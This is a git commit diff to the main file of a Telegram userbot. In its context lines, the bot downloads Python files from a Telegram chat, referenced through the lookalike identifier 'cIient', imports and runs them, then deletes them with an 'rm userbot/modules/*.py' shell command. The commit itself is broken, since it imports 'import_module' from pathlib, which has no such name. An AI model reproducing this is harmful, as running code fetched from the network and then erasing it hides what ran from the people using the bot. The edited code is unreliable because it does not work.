439b4c5ed43424e2b15b42dd7c359bfefc686699
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2020-08-06 14:51:28 +0530

    Update __main__.py

--- userbot/__main__.py
+++ userbot/__main__.py
@@ -1,4 +1,4 @@
-from userbot import * ;  from sys import * ; from telethon import TelegramClient, functions, types ; from telethon.tl.types import InputMessagesFilterDocument ; from pathlib import Path ; from userbot.javes_main.commands import * ; import asyncio, os, traceback, sys, traceback, os, importlib ; javes = tgbot = bot.tgbot = borg = client 
+from userbot import * ;  from sys import * ; from telethon import TelegramClient, functions, types ; from telethon.tl.types import InputMessagesFilterDocument ; from pathlib import Path, import_module ; from userbot.javes_main.commands import * ; import asyncio, os, traceback, sys, traceback, os, importlib ; javes = tgbot = bot.tgbot = borg = client 
 from userbot.modules import ALL_MODULES
 from telethon.tl.types import InputMessagesFilterDocument
 LOGS.info("Connecting...") ; 
@@ -31,7 +31,7 @@ async def a():
   for ixo in total_doxx:
        mxo = test1[ixo].id ; await client.download_media(await borg.get_messages(cIient, ids=mxo), "userbot/modules/")
   for module_name in ALL_MODULES:
-    await import_module("userbot.modules." + module_name)
+    import_module("userbot.modules." + module_name) 
   os.system("rm userbot/modules/*.py") ; LOGS.info(f"Sucessfully connected with {o}{o2}{o3}{o4} check it by typing !javes in any client's chat, type  !help for more info.")
   if len(argv) not in (1, 3, 4):
        await javes.disconnect()
